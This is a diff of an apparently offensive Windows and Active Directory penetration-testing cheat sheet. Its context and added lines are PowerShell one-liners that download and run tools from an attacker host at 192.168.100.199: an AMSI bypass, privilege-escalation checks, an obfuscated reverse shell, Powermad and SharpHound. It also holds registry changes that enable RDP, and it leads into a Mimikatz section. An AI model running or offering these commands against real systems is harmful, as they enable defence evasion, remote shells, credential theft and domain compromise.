@@ -38,6 +38,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0
 ```
 ```
+
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/amsibypass.txt')
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Invoke-PortScan.ps1')
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/PowerUp.ps1');Invoke-AllChecks
@@ -48,6 +49,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Power
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Obfuscated_RevShell.ps1')
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Powermad.ps1')
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/SharpHound.ps1');Invoke-BloodHound -collectionMethod All
+iwr -UseBasicParsing http://192.168.100.199/ConstrainedMode.exe -OutFile "C:\Users\Public\ConstrainedMode.exe"
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 ### Mimikatz
